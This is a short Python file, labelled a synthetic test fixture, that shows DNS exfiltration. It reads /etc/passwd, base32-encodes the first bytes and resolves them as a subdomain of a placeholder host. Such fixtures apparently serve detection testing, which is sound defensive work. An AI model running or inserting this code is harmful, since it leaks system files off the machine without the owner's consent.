# Synthetic fixture: data encoded into a hostname and resolved (DNS exfil).
import base64
import socket

payload = open("/etc/passwd", "rb").read()
socket.gethostbyname(base64.b32encode(payload[:30]).decode() + ".x.example.invalid")
